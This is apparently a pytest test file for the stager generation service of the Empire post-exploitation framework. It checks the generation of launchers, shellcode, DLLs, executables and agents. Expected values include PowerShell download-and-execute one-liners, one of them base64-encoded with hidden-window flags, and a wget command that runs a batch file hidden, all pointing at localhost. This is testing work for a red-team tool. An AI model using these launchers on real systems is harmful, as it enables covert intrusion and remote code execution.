import base64
import platform
import re
from pathlib import Path

import pytest

from empire.server.common.empire import MainMenu
from empire.server.stagers.multi.generate_agent import Stager
from empire.server.utils.file_util import run_as_user

is_arm = platform.machine().startswith("arm") or platform.machine().startswith(
    "aarch64"
)


@pytest.fixture(scope="module")
def stager_generation_service(main: MainMenu):
    return main.stagergenv2


def test_compiler(main, empire_config):
    dotnet_compiler = main.dotnet_compiler
    compiler_dir = dotnet_compiler.compiler_dir
    compiler_path = compiler_dir / "EmpireCompiler"

    assert compiler_path.is_file(), f"EmpireCompiler binary not found at {compiler_dir}"

    result = run_as_user([str(compiler_path), "--help"], text=True, capture_output=True)
    assert "Usage:" in result, "Unexpected output from EmpireCompiler --help"


def test_generate_launcher_fetcher(stager_generation_service):
    launcher = stager_generation_service.generate_launcher_fetcher(encode=False)

    assert (
        launcher
        == 'wget "http://127.0.0.1/launcher.bat" -outfile "launcher.bat"; Start-Process -FilePath .\\launcher.bat -Wait -passthru -WindowStyle Hidden;'
    )


def test_generate_launcher(stager_generation_service):
    pass


@pytest.mark.parametrize(
    ("obfuscate", "encode", "expected_launcher"),
    [
        (
            False,
            False,
            """$wc=New-Object System.Net.WebClient;$bytes=$wc.DownloadData("http://localhost:1336/download/powershell/");$assembly=[Reflection.Assembly]::load($bytes);$assembly.EntryPoint.Invoke($null,$null);""",
        ),
        (
            False,
            True,
            "powershell -noP -sta -w 1 -enc  JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABiAHkAdABlAHMAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQAzADMANgAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAiACkAOwAkAGEAcwBzAGUAbQBiAGwAeQA9AFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkACgAJABiAHkAdABlAHMAKQA7ACQAYQBzAHMAZQBtAGIAbAB5AC4ARQBuAHQAcgB5AFAAbwBpAG4AdAAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAJABuAHUAbABsACkAOwA=",
        ),
    ],
)
def test_generate_exe_oneliner(
    stager_generation_service, obfuscate, encode, expected_launcher
):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="",
        encode=encode,
        listener_name="new-listener-1",
    )
    assert expected_launcher in launcher


@pytest.mark.parametrize(
    ("obfuscate", "encode"),
    [
        (True, False),
        (True, True),
    ],
)
def test_obfuscate_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
    launcher = stager_generation_service.generate_exe_oneliner(
        language="powershell",
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1",
        encode=encode,
        listener_name="new-listener-1",
    )
    assert launcher is not None


def test_generate_dll(stager_generation_service):
    dll_bytes = stager_generation_service.generate_dll("posh_code", "x64")
    assert len(dll_bytes) == 665088  # noqa: PLR2004


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net35", False),
        ("net40", True),
        ("net35", True),
    ],
)
def test_generate_powershell_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_powershell_exe(
        "posh_code", dot_net_version, obfuscate
    )

    assert result is not None
    assert result.exists(), f"Generated file not found: {result}"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
        ("x86", "net35"),
        ("x64", "net35"),
        ("both", "net35"),
    ],
)
def test_generate_powershell_shellcode(
    stager_generation_service, arch, dot_net_version
):
    shellcode, err = stager_generation_service.generate_powershell_shellcode(
        "posh_code", arch, dot_net_version
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert (
        len(shellcode) > 100  # noqa: PLR2004
    ), f"Shellcode is too short: {len(shellcode)} bytes"
    assert shellcode.startswith(b"\xe8"), (
        "Shellcode does not start with the expected byte"
    )
    assert re.search(rb"\x00\x00\x00\x00", shellcode), (
        "Expected byte sequence not found in shellcode"
    )


@pytest.mark.parametrize(
    ("dot_net_version", "obfuscate"),
    [
        ("net40", False),
        ("net40", True),
    ],
)
def test_generate_python_exe(stager_generation_service, dot_net_version, obfuscate):
    result = stager_generation_service.generate_python_exe(
        "python_code", dot_net_version, obfuscate
    )

    assert result is not None
    assert result.exists(), f"Generated file not found: {result}"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
    ],
)
def test_generate_python_shellcode(stager_generation_service, arch, dot_net_version):
    shellcode, err = stager_generation_service.generate_python_shellcode(
        "python_code", arch, dot_net_version
    )

    assert err is None, f"Unexpected error: {err}"
    assert shellcode is not None, "Shellcode was not generated"
    assert isinstance(shellcode, bytes), "Generated shellcode is not in bytes format"
    assert len(shellcode) > 0, "Generated shellcode is empty"


def test_generate_go_stageless(stager_generation_service):
    """
    Test the generate_go_stageless function using a real listener (new-listener-1).
    """
    options = {"Listener": {"Value": "new-listener-1"}}

    result = stager_generation_service.generate_go_stageless(options)

    assert result is not None, "Stager generation failed, result is None."

    generated_executable_path = result
    assert Path(generated_executable_path).exists(), (
        f"Generated executable not found: {generated_executable_path}"
    )

    generated_main_go_path = (
        stager_generation_service.main_menu.install_path / "data/agent/gopire/main.go"
    )
    assert generated_main_go_path.exists(), (
        f"Generated main.go not found: {generated_main_go_path}"
    )

    main_go_content = generated_main_go_path.read_text()
    staging_key_base64_match = re.search(
        r'stagingKeyBase64\s*:=\s*"([^"]+)"', main_go_content
    )

    assert staging_key_base64_match, "stagingKeyBase64 not found in main.go"

    extracted_staging_key_base64 = staging_key_base64_match.group(1)

    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    staging_key = active_listener.options["StagingKey"]["Value"]

    expected_staging_key_base64 = base64.b64encode(staging_key.encode("UTF-8")).decode(
        "UTF-8"
    )
    assert extracted_staging_key_base64 == expected_staging_key_base64, (
        f"StagingKeyBase64 mismatch: expected {expected_staging_key_base64}, got {extracted_staging_key_base64}"
    )


@pytest.mark.parametrize(
    ("language", "listener_name", "obfuscate", "encode", "expected_partial_launcher"),
    [
        (
            "go",
            "new-listener-1",
            False,
            False,
            r'\$tempFilePath = \[System.IO.Path\]::Combine\(\[System.IO.Path\]::GetTempPath\(\), "[\w\d]+\.exe"\);',
        ),
        (
            "go",
            "new-listener-1",
            True,
            False,
            None,
        ),
        (
            "go",
            "new-listener-1",
            False,
            True,
            None,
        ),
    ],
)
def test_generate_go_exe_oneliner(
    stager_generation_service,
    language,
    listener_name,
    obfuscate,
    encode,
    expected_partial_launcher,
):
    launcher = stager_generation_service.generate_go_exe_oneliner(
        language=language,
        listener_name=listener_name,
        obfuscate=obfuscate,
        obfuscation_command="Token\\ALL\\1" if obfuscate else "",
        encode=encode,
    )

    assert launcher is not None, "Launcher generation failed, result is None."

    if not obfuscate and not encode:
        assert re.search(expected_partial_launcher, launcher), (
            f"Launcher does not contain expected content: {launcher}"
        )

    if obfuscate or encode:
        # Check if launcher is a string
        assert isinstance(launcher, str), (
            f"Expected launcher to be a string, but got {type(launcher)}."
        )

        # Check if launcher has a non-zero length
        assert len(launcher) > 0, "Launcher is empty; expected non-empty string."

    if encode:
        assert re.match(
            r"powershell -noP -sta -w 1 -enc\s+[A-Za-z0-9+/=]+",
            launcher,
        ), f"Encoded launcher does not match expected structure: {launcher}"


def test_generate_dylib(stager_generation_service):
    """
    Tests the generate_dylib function to ensure it creates a dylib with an embedded launcher code.
    """
    launcher_code = "import os; print('Hello, World!')"
    arch = "x64"
    hijacker = "false"

    result = stager_generation_service.generate_dylib(launcher_code, arch, hijacker)

    assert result is not None, "generate_dylib returned None"
    assert len(result) > 9000  # noqa: PLR2004


def test_generate_appbundle(stager_generation_service):
    launcher_code = "import os; print('Hello, World!')"
    arch = "x64"
    icon = ""
    app_name = ""
    disarm = False

    result = stager_generation_service.generate_appbundle(
        launcher_code, arch, icon, app_name, disarm
    )

    assert result is not None, "generate_appbundle returned None"
    assert len(result) > 9000  # noqa: PLR2004


def test_generate_jar(stager_generation_service):
    launcher_code = "import os; print('Hello, World!')"
    result = stager_generation_service.generate_jar(launcher_code)

    assert result is not None, "generate_jar returned None"
    assert len(result) > 1000  # noqa: PLR2004


@pytest.mark.parametrize(
    ("language", "expected_substrings"),
    [
        ("python", ["def run(", "server=", "class Stage"]),
        ("ironpython", ["def run(", "server=", "class Stage"]),
        (
            "powershell",
            [
                "function Invoke-Empire {",
                "function Start-Negotiate {",
                '$ErrorActionPreference = "SilentlyContinue"',
            ],
        ),
    ],
)
def test_generate_stageless(stager_generation_service, language, expected_substrings):
    """
    Test the generate_stageless function for different supported languages.
    """
    options = {
        "Listener": {"Value": "new-listener-1"},
        "Language": {"Value": language},
    }

    result = stager_generation_service.generate_stageless(options)

    assert result is not None, f"Stageless agent generation failed for {language}."
    assert isinstance(result, str), (
        f"Generated stageless agent for {language} should be a string."
    )

    for substring in expected_substrings:
        assert substring in result, (
            f"Expected '{substring}' in the generated {language} agent."
        )


def test_generate_upload(stager_generation_service):
    pass


def test_multi_generate_agent_stageless_powershell(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = "False"

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "function Invoke-Empire {" in result
    assert "function Start-Negotiate {" in result
    assert '$ErrorActionPreference = "SilentlyContinue"' in result


def test_multi_generate_agent_staged_powershell(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = "True"

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "function Invoke-Empire {" not in result
    assert "DownloadData(" in result or "WebClient" in result


def test_multi_generate_agent_stageless_python(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "python"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = "False"

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "def run(" in result
    assert "class Stage" in result
